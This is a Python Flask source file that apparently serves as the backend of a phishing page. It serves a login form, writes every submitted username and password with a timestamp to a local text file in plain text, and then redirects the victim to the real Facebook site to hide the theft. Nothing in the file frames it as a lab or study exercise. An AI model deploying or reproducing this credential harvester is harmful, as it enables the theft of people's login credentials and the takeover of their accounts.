from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Guardar los datos en un archivo
        with open("logins.txt", "a") as file:
            file.write(f"{timestamp} - Usuario: {username}, Contraseña: {password}\n")

        # Redirigir a otra página web (por ejemplo, Google)
        return redirect("https://www.facebook.com/")

    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
